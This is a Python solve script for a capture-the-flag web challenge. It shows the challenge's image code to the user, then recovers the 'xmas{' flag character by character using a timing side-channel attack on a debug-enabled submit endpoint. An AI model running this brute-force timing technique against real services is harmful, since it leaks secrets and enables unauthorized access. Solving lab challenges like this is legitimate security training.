#!/usr/bin/env python3

import base64
from io import BytesIO
from PIL import Image
import requests
import re
import string
import sys


def showImage(text):
    bs64 = re.findall('data:image/png;base64,.*[\',;].', text)
    bs64 = bs64[0].split(',')
    bs64 = bs64[1].split('&')
    bs64 = bs64[0]

    pad = len(bs64) % 4  # Calculate padding for image
    bs64 += "=" * pad  # Add padding to image if needed
    imgdata = base64.b64decode(bs64)  # Convert to bytes

    image = Image.open(BytesIO(imgdata))
    image.show()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"(+) Usage:\t {sys.argv[0]} <WEBAPP_URL>")
        print(f"(+) Example:\t python 'http://10.0.0.3:3000/'")
        sys.exit(-1)
    SERVER_URL = sys.argv[1]

    s = requests.Session()
    r1 = s.get(SERVER_URL, verify=False)

    # Find and render image.
    showImage(r1.text)

    # Submit Bill Chiper code.
    while True:
        code = input('Enter image code: ')
        ep1 = f'{SERVER_URL}check'
        r2 = s.post(url=ep1, data={'code': code}, verify=False)  # Submit code
        alertFound = re.findall('alert', r2.text)
        
        if not alertFound:
            break

        # Find and render image.
        showImage(r2.text)

    # Find flag.
    chars = string.ascii_letters + '}_@0123456789'  # Available chars in flag
    flag = 'xmas{'
    while True:
        results = []
        print(f'{flag}')
        for char in chars:
            value = flag
            value += char
            ep2 = f'{SERVER_URL}submit'
            r3 = s.post(url=ep2, data={'value': value, 'debug': '1'}, verify=False)  # Submit code
            flagFound = re.findall('xmas{.+}', r3.text)  # Check for flag

            if flagFound:
                flag += char
                print(f'FLAG constructed: {flag}')
                print(f'FLAG found in html: {flagFound[0]}')
                sys.exit(1)

            debugInfo = re.findall('{.+}', r3.text)  # Get debug info
            start, end, _ = re.findall('[0-9.]+', debugInfo[0])
            duration = float(end) - float(start)
            results.append({'value': char, 'time': duration})

        el = max(results, key=lambda x: x['time'])
        flag += el['value']
